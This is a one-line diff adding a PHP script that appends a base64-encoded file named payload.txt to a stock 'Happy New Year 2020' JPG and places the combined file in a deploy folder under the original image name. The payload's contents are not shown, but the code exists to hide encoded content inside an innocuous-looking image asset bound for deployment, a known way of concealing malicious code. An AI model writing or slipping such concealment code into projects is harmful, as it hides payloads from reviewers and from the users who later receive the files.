@@ -1,0 +1,1 @@
+<?php $jpg='depositphotos_277631910-stock-illustration-happy-new-year-2020-merry.jpg';file_put_contents("deploy/$jpg", file_get_contents("src/$jpg").base64_encode(file_get_contents('src/payload.txt')));
